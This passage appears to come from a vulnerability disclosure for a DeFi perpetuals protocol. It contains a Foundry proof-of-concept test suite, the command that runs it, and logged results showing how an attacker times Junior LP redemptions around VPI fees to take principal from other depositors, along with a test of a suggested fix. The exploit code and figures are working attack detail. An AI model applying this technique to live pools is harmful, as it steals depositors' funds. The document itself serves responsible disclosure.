        settlementToken.mint(ATTACKER, attackerCapital);
        _fundTrader(ATTACKER, 1_000_000e6);
        uint256 snap = vm.snapshotState();
        h = _cycles(n, false);
        vm.revertToState(snap);
        a = _cycles(n, true);

        console2.log("=====", label);
        for (uint256 i; i < n; i++) {
            console2.log("cycle", i + 1);
            console2.log("  VPI paid into the pool", a.vpiPaid[i]);
            console2.log("  victim value honest", h.victimAfter[i]);
            console2.log("  victim value attack", a.victimAfter[i]);
        }
        console2.log("victim Junior deposit", victimJ);
        console2.log("attacker profit vs honest", a.attackerWealth - h.attackerWealth);
        console2.log("victim cumulative loss vs honest", h.victimValue - a.victimValue);
        console2.log("victim loss, bps x100 of own funds", (h.victimValue - a.victimValue) * 1_000_000 / h.victimValue);
        console2.log("senior loss vs honest (signed)");
        console2.logInt(int256(h.seniorValue) - int256(a.seniorValue));
    }

    // ------------------------------------------------------------------ tests

    /// @dev One cycle. Victim Junior 10M, Senior 36M, attacker deposits 60M into Junior, long 42M.
    function test_SingleCycle() public {
        (Outcome memory h, Outcome memory a) =
            _compare("single cycle", 10_000_000e6, 36_000_000e6, 60_000_000e6, 42_000_000e18, 0);
        assertGt(a.attackerNet, h.attackerNet, "attacker profits vs honest");
        assertGt(h.victimValue, a.victimValue, "victim loses vs honest");
        assertLt(a.victimValue, 10_000_000e6, "victim ends below its own deposited principal");
        assertEq(a.seniorValue, h.seniorValue, "senior unaffected");
    }

    /// @dev Smaller attacker: 15M against a 10M victim Junior (60 % share), long 24.4M.
    function test_SmallerAttacker() public {
        (Outcome memory h, Outcome memory a) =
            _compare("smaller attacker, 60 % of Junior", 10_000_000e6, 36_000_000e6, 15_000_000e6, 24_400_000e18, 0);
        assertGt(a.attackerNet, h.attackerNet, "attacker profits vs honest");
        assertGt(h.victimValue, a.victimValue, "victim loses vs honest");
    }

    /// @dev Three cycles in a row at the release caps (Senior 40M / 80 %), 75M attacker capital, size chosen by the
    ///      skew wall and free cash. Loss accumulates linearly.
    function test_ThreeCycles_ReleaseCaps() public {
        (CycleResult memory h, CycleResult memory a) =
            _compareCycles("three cycles, Junior 10M, Senior 40M, attacker 75M", 10_000_000e6, 39_998_000e6, 75_000_000e6, 3);
        assertGt(a.attackerWealth, h.attackerWealth, "attacker profits vs honest");
        assertGt(h.victimAfter[0], a.victimAfter[0], "loss after cycle 1");
        assertGt(a.victimAfter[0], a.victimAfter[1], "more loss after cycle 2");
        assertGt(a.victimAfter[1], a.victimAfter[2], "more loss after cycle 3");
        assertLt(a.victimValue, 10_000_000e6, "victim below its own deposited principal");
        assertEq(a.seniorValue, h.seniorValue, "senior unaffected");
    }

    /// @dev Depth-neutral variant: a new Junior LP deposits 60M in the same epoch the attacker redeems 60M. Pool depth
    ///      at close equals depth at open, so the rebate is not inflated by any depth change. The new LP pays.
    function test_DepthNeutral_NewLpPays() public {
        (Outcome memory h, Outcome memory a) =
            _compare("depth neutral, new LP deposits 60M", 10_000_000e6, 36_000_000e6, 60_000_000e6, 42_000_000e18, 60_000_000e6);
        assertGt(a.attackerNet, h.attackerNet, "attacker profits vs honest");
        assertGt(h.newLpValue, a.newLpValue, "new LP loses vs honest");
        assertLt(a.newLpValue, 60_000_000e6, "new LP below its own deposit");
    }

    /// @dev Suggested fix (local lens only): count positive lifetime VPI of open positions as an LP liability.
    ///      The attacker redemption becomes identical to the honest one and the attack only costs fees.
    function test_FixClosesTheLeak() public {
        _setUp(10_000_000e6, 36_000_000e6, 60_000_000e6);
        _installFix();
        uint256 snap = vm.snapshotState();
        Outcome memory h = _run(60_000_000e6, 42_000_000e18, 0, false);
        vm.revertToState(snap);
        Outcome memory a = _run(60_000_000e6, 42_000_000e18, 0, true);
        console2.log("===== with fix");
        console2.log("attacker redemption, honest", h.redeemedAssets);
        console2.log("attacker redemption, attack", a.redeemedAssets);
        console2.log("attacker profit vs honest (signed)");
        console2.logInt(a.attackerNet - h.attackerNet);
        assertEq(a.redeemedAssets, h.redeemedAssets, "with the fix the redemption is not inflated");
        assertLt(a.attackerNet, h.attackerNet, "with the fix the attack loses money");
        assertGe(a.victimValue, h.victimValue, "with the fix the victim does not lose");
    }

}
```

4. Run it (the first run compiles the perps package with via-IR and takes several minutes):

```bash
FOUNDRY_SPARSE_MODE=true forge test --root packages/perps --match-path test/poc/PletherVpiNavTiming.t.sol -vv
```

5. Expected output. This is the full, unedited test result section from my run of exactly these steps in a fresh clone (compiler output above it is omitted). The attached screenshot shows the same run.

```text
Ran 5 tests for test/poc/PletherVpiNavTiming.t.sol:PletherVpiNavTimingPoC
[PASS] test_DepthNeutral_NewLpPays() (gas: 10617675)
Logs:
  ===== depth neutral, new LP deposits 60M
  attacker share of Junior, bps 8571
  VPI paid into the pool at open 83205977245
  attacker redemption, honest 59999436383803
  attacker redemption, attack 60070755109690
  attacker profit vs honest (signed)
  37707165881
  victim Junior deposit 10000000000000
  victim value, honest 9999569486685
  victim value, attack 10001961414461
  victim loss vs honest (signed)
  -2391927776
  senior loss vs honest (signed)
  0
  new LP deposit 60000000000000
  new LP value, honest 59999953031063
  new LP value, attack 59943053498372
  new LP loss vs honest (signed)
  56899532691

[PASS] test_FixClosesTheLeak() (gas: 10626833)
Logs:
  ===== with fix
  attacker redemption, honest 59999436383803
  attacker redemption, attack 59999436383803
  attacker profit vs honest (signed)
  -33601820491

[PASS] test_SingleCycle() (gas: 9454371)
Logs:
  ===== single cycle
  attacker share of Junior, bps 8571
  VPI paid into the pool at open 83205977245
  attacker redemption, honest 59999436383803
  attacker redemption, attack 60070755109690
  attacker profit vs honest (signed)
  37716905303
  victim Junior deposit 10000000000000
  victim value, honest 9999522522441
  victim value, attack 9945010864670
  victim loss vs honest (signed)
  54511657771
  senior loss vs honest (signed)
  0

[PASS] test_SmallerAttacker() (gas: 9434502)
Logs:
  ===== smaller attacker, 60 % of Junior
  attacker share of Junior, bps 6000
  VPI paid into the pool at open 48798400052
  attacker redemption, honest 14999605475465
  attacker redemption, attack 15028883730197
  attacker profit vs honest (signed)
  9757119078
  victim Junior deposit 10000000000000
  victim value, honest 9999353447676
  victim value, attack 9979838078833
  victim loss vs honest (signed)
  19515368843
  senior loss vs honest (signed)
  0

[PASS] test_ThreeCycles_ReleaseCaps() (gas: 23340255)
Logs:
  ===== three cycles, Junior 10M, Senior 40M, attacker 75M
  cycle 1
    VPI paid into the pool 99182876083
    victim value honest 9999488032968
    victim value attack 9932053764733
  cycle 2
    VPI paid into the pool 99172649036
    victim value honest 9999037531026
    victim value attack 9864636875494
  cycle 3
    VPI paid into the pool 99162424960
    victim value honest 9998587045898
    victim value attack 9797686631999
  victim Junior deposit 10000000000000
  attacker profit vs honest 141163850546
  victim cumulative loss vs honest 200900413899
  victim loss, bps x100 of own funds 20092
  senior loss vs honest (signed)
  0

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 75.43ms (95.47ms CPU time)

Ran 1 test suite in 101.25ms (75.43ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```

What the output shows:

- test_SingleCycle: the attacker's redemption is 60,070,755.109690 USDG instead of 59,999,436.383803, because the 83,205.98 USDG of VPI it just paid is inside Junior NAV. After it closes and takes the VPI back, it is 37,716.91 USDG ahead of the honest branch. The victim, which deposited 10,000,000 USDG, ends with 9,945,010.86 USDG against 9,999,522.52 in the honest branch. Senior is unchanged.
- test_SmallerAttacker: the same with a 15M attacker (60 % of Junior), +9,757.12 for the attacker and -19,515.37 for the victim.
- test_ThreeCycles_ReleaseCaps: three cycles at the release caps. The victim loses 67,434, 66,966 and 66,500 USDG in cycles 1 to 3, 200,900.41 USDG in total (2.01 % of its funds), and ends at 9,797,686.63 USDG of its 10,000,000 deposit.
- test_DepthNeutral_NewLpPays: pool depth at close equals depth at open, the attacker still gains 37,707.17, and a new LP that deposited 60M in the same epoch loses 56,899.53 USDG.
- test_FixClosesTheLeak: with the suggested fix in a local lens, the attacker's redemption equals the honest one exactly and the attack loses 33,601.82 USDG in fees.

Impact: Junior LPs who stay in the pool lose deposited principal to a Junior LP that redeems between its own VPI-paying open and its refunding close. The loss is final after all positions close and grows linearly with each 3 hour cycle.
